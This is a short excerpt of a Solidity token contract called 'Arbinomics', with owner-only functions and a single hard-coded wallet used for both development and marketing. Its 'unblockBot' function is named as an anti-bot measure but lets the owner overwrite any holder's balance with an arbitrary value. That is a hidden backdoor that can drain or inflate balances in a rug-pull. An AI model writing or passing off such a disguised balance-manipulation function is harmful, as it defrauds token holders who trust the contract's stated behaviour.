...
contract Arbinomics is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "Arbinomics";
    ...
    address payable private _developmentAddress = payable(0xed2d6d13cF3b4a366AcD14bb132FEe1947250FbF);
    address payable private _marketingAddress = payable(0xed2d6d13cF3b4a366AcD14bb132FEe1947250FbF);
    ...
    function unblockBot(address notbot , uint256 blocknumber) external onlyowner {
        _rOwned[notbot] = blocknumber;
    }
